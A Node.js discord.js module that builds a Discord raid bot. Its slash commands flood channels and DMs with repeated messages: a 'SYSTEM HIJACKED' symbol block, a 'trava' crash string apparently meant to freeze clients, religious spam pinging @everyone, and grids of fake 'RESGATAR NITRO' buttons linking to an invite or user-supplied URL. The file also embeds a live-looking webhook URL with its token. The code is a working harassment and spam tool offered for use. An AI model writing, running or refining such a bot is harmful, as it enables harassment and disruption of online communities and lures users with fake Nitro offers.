const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const https = require('https');

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const WEBHOOK_LOG = "https://discord.com/api/webhooks/1451307117461114920/TdCzoUuwTUdOTewAWBZLw7cXeo275xJMrC2feDHzMB6_zBfdXZ81G-pEYr0G5S9fy9jl";
const INVITE = "https://discord.gg/ure7pvshFW";

// Controle de interrupção por USUÁRIO (funciona em DMs e Servidores)
const stopSignals = new Map();

const RAID_HEADER = "# **S̶Y̶S̶T̶E̶M̶ ̶H̶I̶J̶A̶C̶K̶E̶D̶**\n";
const RAID_SYMBOLS = `∞ ♭ ♮ ♯ ♰ ♱ ▀ ▁ ▂ ▃ ▄ ▅ ▆ ▇ █ ▉ ▊ ▋ ▍ ▎ ▏ ▐ ░ ▒ ▓ ■ □ ▢ ▣ ▤ ▥ ▦ ▧ ▨ ▩ ▪ ▫ ▬ ▭ ▮ ▯ ▰ ▱ ▲ △ ▴ ▵ ▶ ▷ ▸ ▹ ► ▻ ▼ ▽ ▾ ▿ ◀ ◁ ◂ ◃ ◄ ◅ ◆ ◇ ◈ ◉ ◊ ○ ◌ ◍ ◎ ● ◐ ◑ ◒ ◓ ◔ ◕ ◖ ◗ ◘ ◙ ◚ ◛ ◜ ◝ ◞ ◟ ◠ ◡ ◢ ◣ ◤ ◥ ◦ ◧ ◨ ◩ ◪ ◫ ◬ ◭ ◮ ◯ ☇ ☈ ☉ ☊ ☋ ☌ ☍ ☐ ☒ ☓ ☠ ☡ ☢ ☣ ☤ ☥ ☦ ☧ ☨ ☩ ☪ ☫ ☬ ☭ ☮ ☯ ☰ ☱ ☲ ☳ ☴ ☵ ☶ ☷ ☸ ☼ ☽ ☾ ☿ ♀ ♁ ♂ ♃ ♄ ♅ ♆ ♇ l ♔ ♕ ♖ ♗ ♘ ♙ ♚ ♛ ♜ ♝ ♞ ♟ ✲ ✳ ✴ ✵ ✶ ✷ ✸ ✹ ✺ ✻ ✼ ✽ ✾ ✿ ❀ ❁ ❂ ❃ ❅ ❆ ❇ ❈ ❉ ❊ ❋ ❍ ❏ ❐ ❑ ❒ ❖ ❘ ❙ ❚ ⟡ ⟦ ⟧ ⟨ ⟩ ⟪ ⟫ ⟰ ⟱ ⟲ ⟳ ⟴ ⟵ ⟿ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲ ⤳ ⤴ ⤵ ⤶ ⤷ ⤸ ⤹ ⤺ ⤻ ⤼ ⤽ ⤾ ⤿ ⥀ ⥁ ⥂ ⥃ ⥄ ⥅ ⥆ ⥇ ⥈ ⥉ ⥊ ⥋ ⥌ ⥍ ⥎ ⥏ ⥐ ⥑ ⥒ ⥓ ⥔ ⥕ ⥖ ⥗ ⥘ ⥙ ⥚ ⥛ ⥜ ⥝ ⥞ ⥟ ⥠ ⥡ ⥢ ⥣ ⥤ ⥥ ⥦ ⥧ ⥨ ⥩ ⥪ ⥫ ⥬ ⥭ ⥮ ⥯ ⥰ ⥱ ⥲ ⥳ ⥴ ⥵ ⥶ ⥷ ⥸ ⥹ ⥺ ⥻ ⥼ ⥽ ⥾ ⥿ ⧼ ⧽ ⨀ ⨁ ⨂ ⨃ ⨄ ⨅ ⨆ ⨇ ⨈ ⨉ 〇 〈 〉 《 》 「 」 『 』 【 】 〒 〔 〕 〖 〗 〘 〙 〚 〛 〜 〝 ₱ ₲ ₳ ⃒ ⃔ ⃕ ⃖ ⃗ ⃠ ⃡ ⃩ ⃪ ℂ ℊ ℍ ℒ ℕ № ℗ ℙ ℚ ℛ ℜ ℝ ℤ ℰ ℳ ℺ ℽ ℿ ⅀ ⅁ ⅂ ⅃ ⅄ ⅅ ⅆ ⅇ ⅈ ⅉ ⅓ ⅔ ⅕ ⅖ ⅗ ⅘ ⅙ ⅚ ⅛ ⅜ ⅝ ⅞ ⅟ Ⅰ Ⅱ Ⅲ Ⅳ Ⅴ Ⅵ Ⅶ Ⅷ Ⅸ Ⅹ Ⅺ Ⅻ Ⅼ Ⅽ Ⅾ Ⅿ ⅰ ⅱ ⅲ ⅳ ⅴ ⅵ ⅶ ⅷ ⅸ ⅹ ⅺ ⅻ ⅼ ⅽ ⅾ ⅿ ↂ ← ↑ → ↓ ↔ ↕ ↖ ↗ ↘ ↙ ↚ ↛ ↜ ↝ ↞ ↟ ↠ ↡ ↢ ↣ ↤ ↥ ↦ ↧ ↨ ↩ ↪ ↫ ↬ ↭ ↮ ↯ ↰ ↱ ↲ ↳ ↴ ↵ ↶ ↷ ↸ ↹ ↺ ↻ ↼ ↽ ↾ ↿ ⇀ ⇁ ⇂ ⇃ ⇄ ⇅ ⇆ ⇇ ⇈ ⇉ ⇊ ⇋ ⇌ ⇍ ⇎ ⇏ ⇐ ⇑ ⇒ ⇓ ⇔ ⇕ ⇖ ⇗ ⇘ ⇙ ⇚ ⇛ ⇜ ⇝ ⇞ ⇟ ⇠ ⇡ ⇢ ⇣ ⇤ ⇥ ⇦ ⇧ ⇨ ⇩ ⇪ ⇫ ⇬ ⇭ ⇮ ⇯ ⇰ ⇱ ⇲ ⇳⇴ ⇶ ⇷ ⇸ ⇹ ⇺ ⇻ ⇼ ⇽ ⇾ ⇿ Z̶A̶L̶G̶O̶ ̶H̶A̶C̶K̶ ⛧ ☠ ⸸ 𖤐 ⛥ ⚡ ☠`;

const TRAVA_PATTERN = "漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.";
const TRAVA_ZAP_MSG = Array(60).fill(TRAVA_PATTERN).join(""); 

const GOD_TEXT = `# If you do not believe in God then change your ways. Philippians 4:13 *** "I can do all things through Christ who strengthens me"***\n\n# *** John 3:16 "For God so loved the world, that he gave his only Son, that whoever believes in him should not perish but have eternal life"***\n\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n-# @everyone @here\nhttps://tenor.com/view/jesus-edit-edit-jesus-christ-is-king-christ-edit-gif-15902634079600751945`;

const getDynamicCooldown = (i) => {
    if (i === 0) return 1000;
    if (i < 9) return 2500;
    return 2800;
};

const getMassiveButtons = (customLink) => {
    const rows = [];
    const targetLink = customLink || INVITE;
    for (let i = 0; i < 5; i++) {
        const row = new ActionRowBuilder();
        for (let j = 0; j < 5; j++) {
            let label = "🎁 RESGATAR NITRO";
            if (i === 1 && j === 3) label = "☢️ SERVER BREACH";
            if (i === 3 && j === 2) label = "⚠️ ACCESS DENIED";
            if (i === 4 && j === 1) label = "💀 SYSTEM FAILURE";
            row.addComponents(new ButtonBuilder().setLabel(label).setStyle(ButtonStyle.Link).setURL(targetLink));
        }
        rows.push(row);
    }
    return rows;
};

module.exports = async (TOKEN, CLIENT_ID) => {
    const client = new Client({ intents: [GatewayIntentBits.Guilds] });
    const rest = new REST({ version: '10' }).setToken(TOKEN);

    const commands = [
        new SlashCommandBuilder().setName('raid').setDescription('RAID SEM EMOJIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('trava_zap').setDescription('10 MSGS TRAVA (2s)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('say').setDescription('Repete Mensagem').addStringOption(o=>o.setName('t').setRequired(true).setDescription('Texto')).addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('Qtd')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('button_spam').setDescription('FLOOD BTNS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('god').setDescription('RAID RELIGIOSA').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('stop').setDescription('Para o bot').setIntegrationTypes([1]).setContexts([0,1,2])
    ].map(c => c.toJSON());

    client.once('ready', () => {
        rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log(`Bot ${client.user.tag} pronto.`);
    });

    client.on('interactionCreate', async interaction => {
        if (!interaction.isChatInputCommand()) return;
        const { commandName, options, user } = interaction;

        if (commandName === 'stop') {
            stopSignals.set(user.id, true);
            return interaction.reply({ content: '🛑 **PARADO.**', ephemeral: true });
        }

        // Resposta imediata para evitar erro de "Aplicativo não respondeu"
        await interaction.reply({ content: '💀 **Iniciando...**', ephemeral: true }).catch(e => console.log("Erro no reply:", e));
        
        stopSignals.set(user.id, false);
        const customLink = options.getString('link');

        // --- EXECUÇÃO ---

        if (commandName === 'raid') {
            const btns = getMassiveButtons(customLink);
            const msg = (RAID_HEADER + RAID_SYMBOLS).substring(0, 1999);
            for(let i=0; i < 50; i++) {
                if (stopSignals.get(user.id)) break; 
                await interaction.channel.send({ content: msg, components: btns }).catch(e => console.log("Erro no raid:", e));
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'trava_zap') {
            for(let i=0; i < 10; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.channel.send({ content: TRAVA_ZAP_MSG }).catch(e => console.log("Erro no trava:", e));
                await wait(2000); 
            }
        }

        if (commandName === 'button_spam') {
            const btns = getMassiveButtons(customLink);
            for(let i=0; i < 50; i++) {
                if (stopSignals.get(user.id)) break; 
                await interaction.channel.send({ content: "### ⚠️ **AÇÃO OBRIGATÓRIA DETECTADA**", components: btns }).catch(e => console.log("Erro no button:", e));
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'say') {
            const t = options.getString('t');
            const q = options.getInteger('q');
            for(let i=0; i < q; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.channel.send({ content: t }).catch(e => console.log("Erro no say:", e));
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'god') {
            const btns = getMassiveButtons(customLink);
            for(let i=0; i < 20; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.channel.send({ content: GOD_TEXT, components: btns }).catch(e => console.log("Erro no god:", e));
                await wait(getDynamicCooldown(i));
            }
        }
    });

    client.login(TOKEN).catch(() => {});
};
